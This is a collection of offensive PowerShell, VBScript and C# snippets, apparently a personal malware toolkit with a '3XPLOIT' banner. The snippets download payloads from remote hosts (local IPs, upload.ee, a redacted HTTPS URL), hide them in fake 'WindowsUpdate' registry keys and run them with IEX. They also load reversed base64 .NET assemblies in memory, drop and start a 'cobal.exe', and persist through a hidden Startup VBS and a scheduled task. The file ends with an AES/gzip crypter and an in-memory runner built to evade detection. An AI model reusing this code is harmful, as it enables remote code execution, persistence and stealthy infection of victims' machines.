$CARGA = (New-Object Net.WebClient).DownloadString('')
New-Item -Path HKCU:\SOFTWARE\Wow6432Node\Microsoft\WindowsUpdate -Value $CARGA

#################################################################

$dl = (New-Object Net.WebClient).DownloadString('http://192.168.0.10:7070/rg.png')
New-Item -Path HKCU:\software\wow6432node\Microsoft\WindowsUpdate -Value $dl

$value = Get-ItemProperty -Path HKCU:\software\wow6432node\Microsoft\WindowsUpdate -Name "(Default)"

IEX ($value."(Default)")

----------------
$proceso = @"
Dim shell,command
command = "pow" & "ershell -windo 1 -noexit -exec bypass -file ""C:\Users\Public\Nod.ps1"""
Set shell = CreateObject("WScript.Shell")
shell.Run command,0
"@
$p = 'C:\Users\' + $env:UserName + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
$proceso | Out-File c:\windows\temp\Update.vbs -Encoding ascii
Copy-Item -Path c:\windows\temp\Update.vbs -Destination $p  -Force; Invoke-Item  c:\windows\temp\Update.vbs

$proceso2 = @"
 function HOMERO(){
`$web = New-Object Net.WebClient;
`$string = `$web.Downloadstring('http://192.168.0.4:7070/b64.txt')
`$assembly = [AppDomain]::CurrentDomain.Load([Convert]::Frombase64String(-join `$string[-1..-`$string.Length]));
`$methodInfo = `$assembly.EntryPoint;
`$create = `$assembly.CreateInstance(`$methodInfo.Name);
`$methodInfo.Invoke(`$500000000,`$500000000);
}
HOMERO
"@
$proceso2 | Out-File C:\Users\Public\Nod.ps1 -Encoding ascii
---------------------

$value = Get-ItemProperty -Path HKCU:\software\wow6432node\Microsoft\WindowsUpdate -Name "(Default)"
#Start-Sleep -s 5

$VARR = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(($value."(Default)")))
$Image = $env:PUBLIC + '\cobal.exe'
[byte[]]$Bytes = [convert]::FromBase64String($VARR)

start-sleep -s 3
[System.IO.File]::WriteAllBytes($Image,$Bytes)
start-sleep -s 3
start $Image 

#powershell -noexit -enc  ($value."(Default)")

---------------------

Powershell C#

$CODIGO=@"

using System;
using System.Net;
namespace Helloword
{

     public static class Hello{
     public static void Main(){
WebClient client = new WebClient ();
string reply = client.DownloadString ("ip/1.txt");
 
Object f= AppDomain.CurrentDomain.Load(Convert.FromBase64String(ReverseString(reply))).EntryPoint.Invoke(null,null);

       }
       
public static string ReverseString(string s)
       {
            char[] arr = s.ToCharArray();
            Array.Reverse(arr);
            return new string(arr);
       }
    }
}

"@

Codif in base64

powershell -wind 1 -noexit -exec bypass -enc eeeeeewereara         or -file ""c:\windows\1.ps1!!

---------------------
Persistencia
start-process -windowstyle hidden schtasks '/change /tn AI /disable';
$appdata_fullpath = $env:userprofile+'\AppData\Roaming'; 
$comp_uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID; 
$uuid_substr = $comp_uuid.Substring(0,6); 
$ps_folder = $appdata_fullpath+'\'+$uuid_substr;
If(test-path $ps_folder"\_in"){break;break;break;}; 
If(!(test-path $ps_folder)){New-Item -ItemType Directory -Force -Path $ps_folder}; 
"start-process -windowstyle hidden powershell.exe "" -c iex ((New-Object ('Net.Webclient')).('DownloadString').invoke(('https://<redacted>/jola/mula')))""" | out-file $ps_folder\XFoXp1UwJ5uzuUNrYbe.ps1; 
$task_command=' /F /create /sc minute /mo 5 /TN "AppRunLog" /ST 07:00 /TR "powershell.exe -windowstyle hidden -exe bypass -file '+$ps_folder+'\XFoXp1UwJ5uzuUNrYbe.ps1 "'; 
start-process -windowstyle hidden schtasks $task_command;

-------------------------------------
$dl = (New-Object Net.WebClient).DownloadString('https://www.upload.ee/download/11864498/440d5dee7d9517698ec3/ss.txt')

New-Item -Path HKCU:\software\wow6432node\Microsoft\WindowsUpdatek -Value $dl 


$value = Get-ItemProperty -Path HKCU:\software\wow6432node\Microsoft\WindowsUpdatek -Name "(Default)"
#Start-Sleep -s 5
function HexToString($i) {
    $r = ""
    for ($n = 0; $n -lt $i.Length; $n += 2)
        {$r += [char][int]("0x" + $i.Substring($n,2))}
    return $r
    }
    $aa = HexToString ($value."(Default)")
    
 powershell -noexit -enc $aa
   -----------------------------------------
$startlogin = @" 
                              ...----....
                         ..-:"''         ''"-..
                      .-'                      '-.
                    .'              .     .       '.
                  .'   .          .    .      .    .''.
                .'  .    .       .   .   .     .   . ..:.
              .' .   . .  .       .   .   ..  .   . ....::.
             ..   .   .      .  .    .     .  ..  . ....:IA.
            .:  .   .    .    .  .  .    .. .  .. .. ....:IA.
           .: .   .   ..   .    .     . . .. . ... ....:.:VHA.
           '..  .  .. .   .       .  . .. . .. . .....:.::IHHB.
          .:. .  . .  . .   .  .  . . . ...:.:... .......:HIHMM.
         .:.... .   . ."::"'.. .   .  . .:.:.:II;,. .. ..:IHIMMA
         ':.:..  ..::IHHHHHI::. . .  ...:.::::.,,,. . ....VIMMHM
        .:::I. .AHHHHHHHHHHAI::. .:...,:IIHHHHHHMMMHHL:. . VMMMM
       .:.:V.:IVHHHHHHHMHMHHH::..:" .:HIHHHHHHHHHHHHHMHHA. .VMMM.
       :..V.:IVHHHHHMMHHHHHHHB... . .:VPHHMHHHMMHHHHHHHHHAI.:VMMI
       ::V..:VIHHHHHHMMMHHHHHH. .   .I":IIMHHMMHHHHHHHHHHHAPI:WMM
       ::". .:.HHHHHHHHMMHHHHHI.  . .:..I:MHMMHHHHHHHHHMHV:':H:WM
       :: . :.::IIHHHHHHMMHHHHV  .ABA.:.:IMHMHMMMHMHHHHV:'. .IHWW
       '.  ..:..:.:IHHHHHMMHV" .AVMHMA.:.'VHMMMMHHHHHV:' .  :IHWV
        :.  .:...:".:.:TPP"   .AVMMHMMA.:. "VMMHHHP.:... .. :IVAI
       .:.   '... .:"'   .   ..HMMMHMMMA::. ."VHHI:::....  .:IHW'
       ...  .  . ..:IIPPIH: ..HMMMI.MMMV:I:.  .:ILLH:.. ...:I:IM
     : .   .'"' .:.V". .. .  :HMMM:IMMMI::I. ..:HHIIPPHI::'.P:HM.
     :.  .  .  .. ..:.. .    :AMMM IMMMM..:...:IV":T::I::.".:IHIMA
     'V:.. .. . .. .  .  .   'VMMV..VMMV :....:V:.:..:....::IHHHMH
       "IHH:.II:.. .:. .  . . . " :HB"" . . ..PI:.::.:::..:IHHMMV"
        :IP""HHII:.  .  .    . . .'V:. . . ..:IH:.:.::IHIHHMMMMM"
        :V:. VIMA:I..  .     .  . .. . .  .:.I:I:..:IHHHHMMHHMMM
        :"VI:.VWMA::. .:      .   .. .:. ..:.I::.:IVHHHMMMHMMMMI
        :."VIIHHMMA:.  .   .   .:  .:.. . .:.II:I:AMMMMMMHMMMMMI
        :..VIHIHMMMI...::.,:.,:!"I:!"I!"I!"V:AI:VAMMMMMMHMMMMMM'
        ':.:HIHIMHHA:"!!"I.:AXXXVVXXXXXXXA:."HPHIMMMMHHMHMMMMMV
          V:H:I:MA:W'I :AXXXIXII:IIIISSSSSSXXA.I.VMMMHMHMMMMMM
            'I::IVA ASSSSXSSSSBBSBMBSSSSSSBBMMMBS.VVMMHIMM'"'
             I:: VPAIMSSSSSSSSSBSSSMMBSSSBBMMMMXXI:MMHIMMI
            .I::. "H:XIIXBBMMMMMMMMMMMMMMMMMBXIXXMMPHIIMM'
            :::I.  ':XSSXXIIIIXSSBMBSSXXXIIIXXSMMAMI:.IMM
            :::I:.  .VSSSSSISISISSSBII:ISSSSBMMB:MI:..:MM
            ::.I:.  ':"SSSSSSSISISSXIIXSSSSBMMB:AHI:..MMM.
            ::.I:. . ..:"BBSSSSSSSSSSSSBBBMMMB:AHHI::.HMMI
            :..::.  . ..::":BBBBBSSBBBMMMB:MMMMHHII::IHHMI
            ':.I:... ....:IHHHHHMMMMMMMMMMMMMMMHHIIIIHMMV"
              "V:. ..:...:.IHHHMMMMMMMMMMMMMMMMHHHMHHMHP'
               ':. .:::.:.::III::IHHHHMMMMMHMHMMHHHHM"
                 "::....::.:::..:..::IIIIIHHHHMMMHHMV"
                   "::.::.. .. .  ...:::IIHHMMMMHMV"
                     "V::... . .I::IHHMMV"'
                       '"VHVHHHAHHHHMMV:"'              < 3XPLOIT >

                       
1 | AES ENCRYPT 
2 | AES RUNNER MEMORY
"@;  




Write-Host $startlogin -ForegroundColor Blue;
function AESPROTECT ($fileData){
    [string]$filename  = $( Read-Host "[INSERT PATH FILE]" )
    $fileData = [System.IO.File]::ReadAllBytes($filename)

# compress
[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
$gzipStream.Write( $fileData, 0, $fileData.Length )
$gzipStream.Close()
$output.Close()
$unencryptedBytes = $output.ToArray() #compressbytes

# generate key
$aes = New-Object "System.Security.Cryptography.AesManaged"
$aes.Mode = [System.Security.Cryptography.CipherMode]::ECB # Don't ever use ECB for anything other than messing around
$aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros #this is also a terrible idea
$aes.BlockSize = 128
$aes.KeySize = 256
$aes.GenerateKey()
$b64key = [System.Convert]::ToBase64String($aes.Key)
Write-Host 'KEY > '    $b64key -ForegroundColor Red
# encrypt
Write-Host
$encryptor = $aes.CreateEncryptor()
$encryptedData = $encryptor.TransformFinalBlock($unencryptedBytes, 0, $unencryptedBytes.Length);
[byte[]] $fullData = $aes.IV + $encryptedData

$aes.Dispose()

$b64encrypted = [System.Convert]::ToBase64String($fullData) # | Out-File -FilePath "C:\Users\pente\OneDrive\Escritorio\encoding.txt"
$b64encrypted 
    

}




$AUXILIAR = @"
`$encData = $b64encrypted 
`$encKey = $b64key

`$aes = New-Object "System.Security.Cryptography.AesManaged"
`$aes.Mode = [System.Security.Cryptography.CipherMode]::ECB 
`$aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
`$aes.BlockSize = 128
`$aes.KeySize = 256
`$aes.Key = [System.Convert]::FromBase64String(`$encKey)
`$bytes = [System.Convert]::FromBase64String(`$encData)
`$IV = `$bytes[0..15]
`$aes.IV = `$IV
`$decryptor = `$aes.CreateDecryptor();
`$unencryptedData = `$decryptor.TransformFinalBlock(`$bytes, 16, `$bytes.Length - 16);
`$aes.Dispose()
`$input = New-Object System.IO.MemoryStream( , `$unencryptedData )
`$output = New-Object System.IO.MemoryStream
`$gzipStream = New-Object System.IO.Compression.GzipStream `$input, ([IO.Compression.CompressionMode]::Decompress)
`$gzipStream.CopyTo( `$output )
`$gzipStream.Close()
`$input.Close()
[byte[]] `$byteOutArray = `$output.ToArray()
`$code = [System.Text.Encoding]::UTF8.GetString(`$byteOutArray) 
.(-join[char[]](105,101,120))(`$code)


"@; 

$Choices = (1..3);

While(!($Choices -like "$Choice"))
{
 
  Write-Host "`n 1 =  AES PROTECT";
 Write-Host "`2 =  AES RUNNER MEMORY";
  Write-Host "`n > " -NoNewline;
  $Choice = Read-Host;
}


If($Choice -eq "1")
{
AESPROTECT

}
If($Choice -eq "2")

{
  [string]$leer  = $( Read-Host "[KEY]" )
$AUXILIAR  = $AUXILIAR.Replace("%EE%",$leer)
Set-Content -Path $env:public\RUNNER.ps1 -Value $AUXILIAR

}
------------------------------------------


